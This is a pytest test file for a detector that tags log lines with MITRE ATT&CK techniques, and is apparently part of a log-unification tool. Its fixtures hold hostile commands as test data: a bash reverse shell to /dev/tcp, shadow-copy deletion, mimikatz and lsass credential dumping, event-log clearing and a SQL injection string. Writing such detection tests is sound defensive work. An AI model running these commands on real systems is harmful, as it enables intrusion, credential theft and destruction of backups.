import pytest

from app.intel import mitre
from app.intel.netutil import is_external, is_internal


@pytest.mark.parametrize("text,technique,rule", [
    ("Audit log cleared by user root on db-01", "T1070", "log_clearing"),
    ("Security logs were wiped on srv-2", "T1070", "log_clearing"),
    ("wevtutil cl Security executed by svc_backup", "T1070", "log_clearing"),
    ("mimikatz sekurlsa::logonpasswords run on host", "T1003", "credential_dumping"),
    ("procdump targeting lsass.exe memory dump", "T1003", "credential_dumping"),
    ("Ransom note dropped in C:\\Users", "T1486", "ransomware"),
    ("EDR: ransomware activity detected on fileserver-3", "T1486", "ransomware"),
    ("4200 files have been encrypted on share", "T1486", "ransomware"),
    ("vssadmin delete shadows /all /quiet", "T1490", "shadow_copy_deletion"),
    ("Unexpected outbound transfer of 628 MB to 198.51.100.23 port 4444", "T1048", "exfiltration"),
    ("SQL injection attempt on web-02", "T1190", "web_exploit"),
    ("GET /search?q=1 UNION SELECT password FROM users", "T1190", "web_exploit"),
    ("Malware callback observed from 10.0.0.5", "T1071", "c2_beacon"),
    ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "T1059", "command_exec"),
    ("Privilege escalation detected: user bob added to group wheel from 1.2.3.4", "T1098", "privileged_group_add"),
    ("user eve was added to the administrators group", "T1098", "privileged_group_add"),
    ("Privilege escalation detected in container runtime", "T1068", "privilege_escalation"),
])
def test_content_rules(text, technique, rule):
    t = mitre.tag({}, text)
    assert t["threat.technique.id"] == technique and t["logunify.mitre.basis"] == f"rule:{rule}"
    assert t["threat.framework"] == "MITRE ATT&CK" and t["labels.mitre_placeholder"] == "true"


def test_field_rules():
    fail = {"event.outcome": "failure", "event.category": "authentication", "source.ip": "8.8.8.8"}
    assert mitre.tag(fail, "x")["logunify.mitre.basis"] == "rule:auth_failure"
    ok_external = {"event.outcome": "success", "event.category": "authentication", "source.ip": "185.220.101.4"}
    t = mitre.tag(ok_external, "Accepted publickey for root")
    assert t["threat.technique.id"] == "T1078" and t["logunify.mitre.basis"] == "rule:external_login"


def test_internal_login_is_not_a_finding():
    ok_internal = {"event.outcome": "success", "event.category": "authentication", "source.ip": "10.1.2.3"}
    assert mitre.tag(ok_internal, "Accepted publickey for alice")["logunify.mitre.basis"] == "default"


def test_default_fallback_is_marked_as_a_placeholder_not_a_match():
    t = mitre.tag({}, "Quarterly frobnication of widget 7")
    assert t["threat.technique.id"] == "T1078" and t["logunify.mitre.basis"] == "default"


def test_specific_content_beats_generic_auth_failure():
    fields = {"event.outcome": "failure", "event.category": "authentication"}
    t = mitre.tag(fields, "Audit log cleared by user root after 3 failed sudo attempts")
    assert t["logunify.mitre.basis"] == "rule:log_clearing"


def test_ordinary_text_does_not_trip_rules():
    for text in ("Connection from 10.0.0.1 port 22 closed after 12 ms", "Session opened for user alice",
                 "Request served status 200 bytes 1234", "Cache refresh completed on web-01 in 55 ms",
                 "Ransomware awareness training completed by 40 staff",       # mentions the word, is not an incident
                 "Log rotation completed for audit logs",                      # 'audit logs' but not cleared/deleted
                 "User alice added to the marketing distribution list"):
        assert mitre.tag({}, text)["logunify.mitre.basis"] == "default", text


def test_netutil():
    assert is_external("8.8.8.8") and is_external("203.0.113.9")          # documentation range is NOT internal
    assert is_internal("10.0.0.1") and is_internal("192.168.1.1") and is_internal("172.16.5.9")
    assert not is_external("not-an-ip") and not is_internal("not-an-ip") and not is_external(None)
